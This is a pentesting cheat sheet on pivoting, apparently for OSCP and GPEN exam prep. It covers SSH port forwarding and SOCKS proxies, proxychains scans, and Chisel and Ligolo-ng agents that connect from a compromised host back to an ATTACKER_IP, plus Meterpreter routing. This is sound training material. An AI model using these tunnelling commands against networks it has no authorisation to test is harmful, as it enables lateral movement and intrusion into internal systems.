# Pivoting Cheat Sheet (GPEN / OSCP)

A quick reference for common pivoting techniques used in penetration testing exams such as **OSCP** and **GPEN**.

---

# 1. Pivoting Mental Model

Always ask:


Who can reach whom?


Example network:


Kali (Attacker)
|
| Internet
|
Pivot Host (Compromised)
|
| Internal Network
|
Internal Target


Goal:


Route traffic through the pivot host to reach internal systems.


---

# 2. SSH Local Port Forwarding

## Purpose

Access **internal services through a pivot machine** by exposing them on your **local machine**.

## Syntax


ssh -L LOCAL_PORT:TARGET_HOST:TARGET_PORT user@pivot


## Example

Internal database:


10.10.10.20:3306


Pivot host:


10.10.10.5


Command:


ssh -L 3306:10.10.10.20:3306 user@10.10.10.5


Connect locally:


mysql -h 127.0.0.1 -P 3306


Traffic flow:


Kali localhost:3306
|
SSH Tunnel
|
Pivot Host
|
10.10.10.20:3306


---

## Example: Internal Web Server


ssh -L 8080:10.10.10.50:80 user@10.10.10.5


Access:


http://localhost:8080


---

# 3. SSH Remote Port Forwarding

## Purpose

Expose a **service on your machine to the pivot host**.

Useful for:

- Reverse shells
- Hosting payloads
- Tool delivery

## Syntax


ssh -R REMOTE_PORT:LOCAL_HOST:LOCAL_PORT user@pivot


## Example

Start a web server on Kali:


python3 -m http.server 80


Create tunnel:


ssh -R 8080:localhost:80 user@10.10.10.5


Pivot machine can access:


http://localhost:8080


Traffic flow:


Pivot Host localhost:8080
|
SSH Tunnel
|
Kali localhost:80


---

# 4. SSH Dynamic Port Forwarding (SOCKS Proxy)

## Purpose

Access **entire internal networks** through a pivot host.

Most common pivoting technique in OSCP.

## Command


ssh -D 1080 user@pivot


Creates proxy:


127.0.0.1:1080


Traffic flow:


Tool
|
SOCKS Proxy
|
SSH Tunnel
|
Pivot Host
|
Internal Network
|
Target


---

# 5. Proxychains Configuration

Edit:


/etc/proxychains.conf


Add:


socks5 127.0.0.1 1080


---

# 6. Use Tools Through Proxy

## Scan Internal Network


proxychains nmap 10.10.10.0/24


## SMB Enumeration


proxychains smbclient -L 10.10.10.20


## Web Browsing


proxychains firefox


---

# 7. Important Nmap Note

Some scans **do not work through SOCKS**.

Avoid:


-sS


Use instead:


-sT


Example:


proxychains nmap -sT -Pn 10.10.10.20


---

# 8. Chisel (HTTP Tunneling)

Used when:

- SSH not available
- Firewall restrictions exist

Chisel tunnels traffic over **HTTP**.

## Start Server (Attacker)


chisel server -p 8000 --reverse


## Run Client (Pivot Host)


chisel client ATTACKER_IP:8000 R:socks


Creates a **SOCKS proxy on Kali**.

Use tools:


proxychains nmap 10.10.10.0/24


Traffic flow:


Internal Network
|
Compromised Host
|
Chisel Client
|
HTTP Tunnel
|
Chisel Server (Attacker)
|
SOCKS Proxy
|
Attacker Tools


---

# 9. Chisel Port Forwarding

Expose internal services.

Server:


chisel server -p 8000


Client:


chisel client ATTACKER_IP:8000 R:3306:10.10.10.20:3306


---

# 10. Ligolo-ng (Advanced Pivoting)

Creates a **VPN-like tunnel**.

Allows normal tools without proxychains.

## Start Proxy (Attacker)


./proxy -selfcert


## Start Agent (Pivot Host)


./agent -connect ATTACKER_IP:11601 -ignore-cert


## Start Session


session
start


Add route:


sudo ip route add 10.10.10.0/24 dev ligolo


Scan normally:


nmap 10.10.10.0/24


Traffic flow:


Kali
|
Ligolo Tunnel
|
Pivot Host
|
Internal Network


---

# 11. Meterpreter Pivoting

If using **Metasploit**.

## Add Route


run autoroute -s 10.10.10.0/24


## Start SOCKS Proxy


use auxiliary/server/socks_proxy
run


Use proxychains:


proxychains nmap 10.10.10.20


---

# 12. Pivot Decision Guide

### If SSH available


ssh -D 1080 user@pivot


Best option.

### If SSH blocked

Use:


chisel


### If you need full network access

Use:


Ligolo-ng


---

# 13. Fast Pivot Workflow (OSCP Style)

1. Compromise machine

2. Check interfaces


ip a


3. Identify internal networks


route


4. Create tunnel


ssh -D 1080 user@pivot


5. Configure proxychains

6. Scan internal network


proxychains nmap -sT -Pn 10.10.10.0/24


7. Exploit internal hosts

---

# 14. Essential Commands to Memorize

### SSH SOCKS Proxy


ssh -D 1080 user@pivot


### Proxychains Scan


proxychains nmap -sT -Pn TARGET


### Local Port Forwarding


ssh -L 8080:TARGET:80 user@pivot


### Remote Port Forwarding


ssh -R 8080:localhost:80 user@pivot


### Chisel Reverse SOCKS


chisel client ATTACKER_IP:8000 R:socks


---

# 15. Exam Tips

✔ Map internal networks first


ip a
route


✔ Use **-sT scans through proxy**

✔ Scan slowly

✔ Test connectivity


proxychains nc TARGET PORT


✔ Pivot step-by-step
